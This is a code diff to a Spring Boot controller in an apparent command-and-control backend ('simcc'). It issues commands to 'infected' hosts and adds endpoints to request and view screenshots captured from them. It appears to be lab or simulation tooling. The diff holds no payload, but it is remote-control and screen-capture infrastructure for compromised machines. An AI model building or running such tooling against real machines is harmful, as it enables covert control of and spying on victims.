@@ -2,6 +2,7 @@ package at.simcc.simcc_backend.api.controller;
 
 import at.simcc.simcc_backend.api.body.InfectedCommandResponse;
 import at.simcc.simcc_backend.api.body.InfectedRegistrationRequest;
+import at.simcc.simcc_backend.api.body.ScreenshotResponse;
 import at.simcc.simcc_backend.api.service.InfectedService;
 import at.simcc.simcc_backend.api.sse.InfectedSSEComponent;
 import at.simcc.simcc_backend.api.ws.payload.CommandOutputPayload;
@@ -11,11 +12,14 @@ import at.simcc.simcc_backend.models.InfectedWithLatestIPDto;
 import jakarta.servlet.http.HttpServletRequest;
 import lombok.RequiredArgsConstructor;
 import lombok.extern.slf4j.Slf4j;
+import org.springframework.http.HttpHeaders;
+import org.springframework.http.HttpStatus;
 import org.springframework.http.MediaType;
 import org.springframework.http.ResponseEntity;
 import org.springframework.validation.annotation.Validated;
 import org.springframework.http.codec.ServerSentEvent;
 import org.springframework.web.bind.annotation.*;
+import org.springframework.web.server.ResponseStatusException;
 import reactor.core.publisher.Flux;
 import tools.jackson.databind.ObjectMapper;
 
@@ -112,7 +116,7 @@ public class InfectedController {
 
     @PostMapping("/command/{iid}")
     public ResponseEntity<InfectedCommandResponse> commandInfected(@PathVariable UUID iid, @RequestBody CommandPayload command) throws IOException, ExecutionException, InterruptedException, TimeoutException {
-        CommandOutputPayload response = infectedService.sendMessage(iid, command);
+        CommandOutputPayload response = infectedService.sendCommand(iid, command);
 
         return ResponseEntity.ok(
                 new InfectedCommandResponse(
@@ -121,5 +125,32 @@ public class InfectedController {
                         response.getStatusCode()
                 )
         );
+    }
+
+    @PostMapping("/screenshot/req/{iid}")
+    public ResponseEntity<ScreenshotResponse> requestScreenshot(@PathVariable UUID iid) throws IOException, ExecutionException, InterruptedException, TimeoutException {
+        UUID screenshotID = infectedService.requestScreenshot(iid);
+
+        return ResponseEntity.ok(
+                new ScreenshotResponse(
+                        "/screenshot/view/%s.jpg"
+                                .formatted(screenshotID)
+                )
+        );
+    }
+
+    @GetMapping("/screenshot/view/{screenshotID}.jpg")
+    public ResponseEntity<byte[]> viewInfectedScreenshot(@PathVariable UUID screenshotID) {
+        Optional<byte[]> screenshotData = infectedService.getScreenshot(screenshotID);
+
+        return ResponseEntity.ok()
+                .contentType(MediaType.IMAGE_JPEG)
+                .header(HttpHeaders.CONTENT_ENCODING, "gzip")
+                .body(screenshotData.orElseThrow(() -> new ResponseStatusException(
+
+                        HttpStatus.NOT_FOUND,
+                        "Screenshot with id %s doesn't exist!"
+                                .formatted(screenshotID)
+                )));
     }
 }
